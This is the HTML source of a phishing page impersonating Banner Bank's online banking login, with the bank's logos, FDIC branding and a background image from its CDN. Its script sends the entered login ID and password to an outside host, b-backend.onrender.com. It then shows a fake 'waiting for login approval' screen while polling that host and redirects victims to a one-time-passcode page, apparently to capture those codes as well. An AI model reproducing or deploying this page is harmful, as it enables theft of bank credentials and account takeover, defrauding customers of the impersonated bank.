<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Banner Bank Login</title>
  <link rel="icon" type="image/png" href="images/BANR-icon.png" />
<style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            background: url('https://cdn1.onlineaccess1.com/cdn/depot/3388/2368/ebf74bd53f74a056456490316c9417b0/assets/images/desktop-background-business_online-a1f48874c11415ee6874fc1a4a921be3.jpeg') no-repeat center center fixed;
            background-size: cover;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .main-container {
            width: 650px;
        }
        .fig-container {
            padding: 10px;
            background-color: white;
            border-radius: 10px;
            display: flex;
            flex-direction: row;
            font-family: sans-serif;
            font-weight: 400;
            font-size: 12.8px;
            line-height: 1;
            min-height: 1rem;
            width: 100%;
            box-sizing: border-box;
            margin-bottom: 20px;
        }
        .fig-container img {
            max-height: 40px;
            width: auto;
            margin-right: 10px;
        }
        .fidc_writing {
            margin-top: 8px;
        }
        .login-container {
            width: 100%;
            border-radius: 5px;
            overflow: hidden;
        }
        .image-section {
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #0051ba;
        }
        .imgg {
            height: 150px;
            width: auto;
        }
        .login-section {
            background-color: #fff;
            padding: 10px 10%;
        }
        .login-form {
            padding: 50px 30px;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        .login-form label {
            font-weight: bold;
            font-family: sans-serif;
            font-size: 14px;
        }
        .login-form input[type="text"],
        .login-form input[type="password"] {
            padding: 10px 50px 10px 10px;
            font-size: 14px;
            border-radius: 5px;
            border: 1px solid #ccc;
            width: 100%;
            box-sizing: border-box;
        }
        .password-container {
            position: relative;
        }
        .show-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #0051ba;
            font-size: 16px;
            cursor: pointer;
            user-select: none;
            width: 20px;
            height: 20px;
            text-align: center;
        }
        .show-password::before {
            content: '\1F441';
        }
        .show-password--visible::before {
            content: '\1F441\0338';
        }
        .show-password:focus {
            outline: 2px solid #0051ba;
            outline-offset: 2px;
        }
        .remember-container {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            font-family: sans-serif;
        }
        .remember-container input[type="checkbox"] {
            opacity: 0;
            position: absolute;
            width: 20px;
            height: 20px;
            margin: 0;
            cursor: pointer;
            z-index: 1;
        }
        .remember-container label {
            font-weight: normal;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .remember-container .checkbox-custom {
            width: 20px;
            height: 20px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        .remember-container .checkbox-custom svg {
            width: 20px;
            height: 20px;
        }
        .remember-container .checkbox-custom rect {
            fill: white;
            stroke: #0051ba;
            stroke-width: 2;
            rx: 3;
            transition: fill 0.2s, stroke 0.2s;
        }
        .remember-container input[type="checkbox"]:checked + .checkbox-custom rect {
            fill: #0051ba;
            stroke: #0051ba;
        }
        .remember-container .checkbox-custom path {
            fill: none;
            stroke: white;
            stroke-width: 2;
            stroke-linecap: round;
            stroke-linejoin: round;
            opacity: 0;
            transition: opacity 0.2s;
        }
        .remember-container input[type="checkbox"]:checked + .checkbox-custom path {
            opacity: 1;
        }
        .remember-container input[type="checkbox"]:focus + .checkbox-custom rect {
            outline: 2px solid #0051ba;
            outline-offset: 2px;
        }
        .remember-container .checkbox-custom:hover rect {
            stroke: #fdd835;
        }
        .login-btn {
            background-color: #fdd835;
            border: none;
            padding: 12px;
            font-weight: bold;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            transition: background 0.3s;
        }
        .login-btn:hover {
            background-color: #fbc02d;
        }
        .login-btn:focus {
            outline: 2px solid #0051ba;
            outline-offset: 2px;
        }
        .login-btn:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        .login-btn[aria-busy="true"]::after {
            content: ' ';
            display: inline-block;
            width: 16px;
            height: 16px;
            margin-left: 8px;
            border: 2px solid #0051ba;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        #waitPage {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            font-family: sans-serif;
            color: white;
        }
        #waitPage .wait-content {
            background: #0051ba;
            padding: 20px;
            border-radius: 5px;
            text-align: center;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        #waitPage .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #fdd835;
            border-top: 4px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .footer-section {
            background-color: #0061b0;
            padding: 15px 0;
            text-align: center;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: center;
        }
        .footer-section a {
            color: white;
            text-decoration: none;
            font-size: 13px;
            border-right: 1px solid white;
            padding: 0 8px;
            font-family: sans-serif;
        }
        .footer-section a:last-child {
            border-right: none;
        }
        @media screen and (max-width: 600px) {
            body {
                padding: 40px 20px;
            }
            .main-container {
                width: 100%;
                margin: 0 auto;
            }
            .fig-container {
                flex-direction: column;
                align-items: center;
                padding: 8px;
            }
            .fig-container img {
                max-height: 30px;
                margin-bottom: 5px;
            }
            .fidc_writing {
                margin-top: 5px;
                font-size: 12px;
                padding: 0 10px;
                text-align: center;
            }
            .image-section {
                justify-content: center;
                align-items: center;
            }
            .imgg {
                height: 60px;
            }
            .login-section {
                padding: 10px 20px;
            }
            .login-form {
                padding: 20px 10px;
                gap: 12px;
            }
            .login-form input[type="text"],
            .login-form input[type="password"] {
                padding: 10px 45px 10px 10px;
                font-size: 13px;
            }
            .show-password {
                font-size: 14px;
                right: 10px;
                width: 18px;
                height: 18px;
            }
            .remember-container {
                font-size: 13px;
            }
            .remember-container .checkbox-custom,
            .remember-container input[type="checkbox"] {
                width: 18px;
                height: 18px;
            }
            .remember-container .checkbox-custom svg {
                width: 18px;
                height: 18px;
            }
            .remember-container .checkbox-custom path {
                stroke-width: 1.5;
            }
            .login-btn {
                padding: 10px;
                font-size: 14px;
            }
            #waitPage .wait-content {
                padding: 15px;
                font-size: 14px;
            }
            #waitPage .spinner {
                width: 30px;
                height: 30px;
                border-width: 3px;
            }
            .footer-section {
                gap: 10px;
                padding: 10px 0;
            }
            .footer-section a {
                font-size: 12px;
            }
        }
     </style>
</head>
<body>
  <section class="main-container">
    <div class="fig-container">
      <div><img src="images/FDIC.jpeg" alt="FDIC Logo" /></div>
      <div class="fidc_writing">FDIC Insured - Backed by the full faith and credit of the U.S. Government</div>
    </div>

    <div class="login-container">
      <div class="image-section">
        <img src="images/bannerbank.png" alt="Banner Bank Logo" class="imgg" />
      </div>

      <div class="login-section">
        <form class="login-form" id="loginForm">
          <label for="login-id">Login ID</label>
          <input type="text" id="login-id" name="login-id" required />

          <label for="password">Password</label>
          <div class="password-container">
            <input type="password" id="password" name="password" required />
            <span class="show-password" role="button" aria-label="Show password" tabindex="0" onclick="togglePassword()"></span>
          </div>

          <div class="remember-container">
            <input type="checkbox" id="remember" aria-label="Remember me" />
            <span class="checkbox-custom">
              <svg aria-hidden="true" width="20" height="20" viewBox="0 0 20 20" focusable="false">
                <rect x="1" y="1" width="18" height="18" rx="3"></rect>
                <path d="M5 10l4 4l6 -6" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
              </svg>
            </span>
            <label for="remember">Remember me</label>
          </div>

          <button type="submit" class="login-btn">Log In</button>
        </form>
      </div>

      <div class="footer-section">
        <a href="#">Locations</a>
        <a href="#">Privacy Policy</a>
        <a href="#">Forgot Password</a>
        <a href="#">Unlock/Forgot Login ID</a>
        <a href="#">Enroll</a>
      </div>
    </div>
  </section>

  <div id="waitPage" role="alert" aria-live="assertive">
    <div class="wait-content">
      <div class="spinner"></div>
      <p>Waiting for login approval...</p>
    </div>
  </div>

  <script>
    function togglePassword() {
      const pwd = document.getElementById('password');
      pwd.type = pwd.type === 'password' ? 'text' : 'password';
    }

    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();
      const loginId = document.getElementById('login-id').value;
      const password = document.getElementById('password').value;

      document.getElementById('waitPage').style.display = 'flex';

      fetch('https://b-backend.onrender.com/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ login: loginId, password: password })
      })
      .then(res => {
        if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
        return res.json();
      })
      .then(data => {
        if (data.success && data.id) {
          checkStatus(data.id);
        } else {
          throw new Error(data.error || 'Login failed');
        }
      })
      .catch(err => {
        console.error('Login error:', err);
        alert(`Error: ${err.message}`);
        document.getElementById('waitPage').style.display = 'none';
      });
    });

    function checkStatus(id) {
      const interval = setInterval(() => {
        fetch(`https://b-backend.onrender.com/status/${id}`)
        .then(res => {
          if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
          return res.json();
        })
        .then(data => {
          if (data.status === 'approved') {
            clearInterval(interval);
            window.location.href = data.redirect_url || 'otp.html';
          }
        })
        .catch(err => {
          console.error('Status check error:', err);
          clearInterval(interval);
          alert(`Error: ${err.message}`);
          document.getElementById('waitPage').style.display = 'none';
        });
      }, 3000);
    }
  </script>
</body>
</html>
